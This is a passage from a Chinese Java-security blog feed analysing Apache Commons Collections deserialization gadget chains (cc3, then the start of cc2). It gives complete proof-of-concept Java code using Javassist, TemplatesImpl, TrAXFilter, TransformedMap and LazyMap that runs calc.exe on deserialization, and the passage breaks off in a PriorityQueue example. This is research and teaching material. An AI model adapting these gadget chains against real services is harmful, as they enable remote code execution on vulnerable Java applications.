class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCOriginal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        transformerChain.transform(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是怎么自动触发调用 <code>transformerChain.transform()</code>方法的问题，根据我们前面cc1和cc2学习到的思路，一共有三种方法可以触发：</p><ul><li>TransformedMap 利用链：<code>TransformedMap.checkSetValue()</code></li><li>LazyMap 利用链：<code>LazyMap.get()</code></li><li>TransformingComparator 利用链：<code>TransformingComparator.compare()</code>（这种思路是cc4中的）</li></ul><h3 id="根据-TransformedMap-利用链完成调用"><a href="#根据-TransformedMap-利用链完成调用" class="headerlink" title="根据 TransformedMap 利用链完成调用"></a>根据 TransformedMap 利用链完成调用</h3><p>根据前面的学习，直接给出最终的反序列化 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">        <span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line">        <span class="keyword">import</span> javassist.CtClass;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line">        <span class="keyword">import</span> java.io.*;</span><br><span class="line">        <span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line">        <span class="keyword">import</span> java.util.HashMap;</span><br><span class="line">        <span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_TransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">confunc</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        confunc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">AIHObject</span> <span class="operator">=</span> (InvocationHandler) confunc.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(AIHObject);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="根据-LazyMap-利用链完成调用"><a href="#根据-LazyMap-利用链完成调用" class="headerlink" title="根据 LazyMap 利用链完成调用"></a>根据 LazyMap 利用链完成调用</h3><p>直接给出最终的反序列化 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">        <span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line">        <span class="keyword">import</span> javassist.CtClass;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line">        <span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line">        <span class="keyword">import</span> java.util.HashMap;</span><br><span class="line">        <span class="keyword">import</span> java.util.Map;</span><br><span class="line">        <span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_LazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">confunc</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        confunc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">AIHObject</span> <span class="operator">=</span> (InvocationHandler) confunc.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(outerMap.getClass().getClassLoader(), outerMap.getClass().getInterfaces(), AIHObject);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">AIHObjectFinal</span> <span class="operator">=</span> (InvocationHandler) confunc.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(AIHObjectFinal);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化时弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604213954505-709958500.png" alt="image-20220604213953177"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/GgBHP0ZrA_73ELK_QLJWuA">https://mp.weixin.qq.com/s/GgBHP0ZrA_73ELK_QLJWuA</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13854098.html">https://www.cnblogs.com/nice0e3/p/13854098.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;cc3链可以说是cc1和cc2链的结合，下面进行分析。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections2分析</title>
    <link href="https://kpa1on.github.io/2022/04/28/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections2%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/04/28/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections2%E5%88%86%E6%9E%90/</id>
    <published>2022-04-28T13:49:24.000Z</published>
    <updated>2022-04-28T17:19:12.238Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前分析了cc1的利用链，但是cc1的利用链是有JDK版本限制的。在JDK8u71版本以后，对<code>AnnotationInvocationHandler</code>的<code>readobject</code>进行了改写，导致高版本中利用链无法使用，这在上文中分析过了。</p><span id="more"></span><p>cc2链中使用的是<code>commons-collections-4.0</code>版本，利用链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>这里cc2链使用<code>commons-collections-4.0</code>版本的原因是，在3.2.1版本以下<code>TransformingComparator</code>并没有去实现<code>Serializable</code>接口，也就是不可以被序列化的，所以在利用链上就不能使用它去构造。</p><p>3.2.1版本</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428220627968-329694528.png" alt="image-20220428220626101"></p><p>4,0版本</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428220713185-1097329589.png" alt="image-20220428220712646"></p><p>在CC2链里不是利用 <code>AnnotationInvocationHandler</code>来构造，而是使用</p><p> <code>javassist</code>和<code>PriorityQueue</code>来构造利用链，所以先来了解下<code>PriorityQueue</code>的基本使用。</p><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p><strong>概念</strong></p><p><code>PriorityQueue</code> 一个基于优先级的无界优先级队列。优先级队列的元素按照其自然顺序进行排序，或者根据构造队列时提供的 Comparator 进行排序，具体取决于所使用的构造方法。该队列不允许使用 null 元素也不允许插入不可比较的对象(没有实现Comparable接口的对象)。<br> <code>PriorityQueue</code> 队列的头指排序规则最小那个元素。如果多个元素都是最小值则随机选一个。<br> <code>PriorityQueue</code> 是一个无界队列，但是初始的容量(实际是一个Object[])，随着不断向优先级队列添加元素，其容量会自动扩容，无需指定容量增加策略的细节。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428221232439-651517910.png" alt="image-20220428221231819"></p><p><strong>构造方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue()           </span><br><span class="line">使用默认的初始容量（<span class="number">11</span>）创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span><br><span class="line">PriorityQueue(<span class="type">int</span> initialCapacity)</span><br><span class="line">使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span><br></pre></td></tr></table></figure><p><strong>常见方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(E e)           将指定的元素插入此优先级队列</span><br><span class="line">clear()            从此优先级队列中移除所有元素。</span><br><span class="line">comparator()       返回用来对此队列中的元素进行排序的比较器；如果此队列根据其元素的自然顺序进行排序，则返回 null</span><br><span class="line">contains(Object o)          如果此队列包含指定的元素，则返回 true。</span><br><span class="line">iterator()           返回在此队列中的元素上进行迭代的迭代器。</span><br><span class="line">offer(E e)           将指定的元素插入此优先级队列</span><br><span class="line">peek()           获取但不移除此队列的头；如果此队列为空，则返回 null。</span><br><span class="line">poll()           获取并移除此队列的头，如果此队列为空，则返回 null。</span><br><span class="line">remove(Object o)           从此队列中移除指定元素的单个实例（如果存在）。</span><br><span class="line">size()           返回此 collection 中的元素数。</span><br><span class="line">toArray()          返回一个包含此队列所有元素的数组。</span><br></pre></td></tr></table></figure><p>代码实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 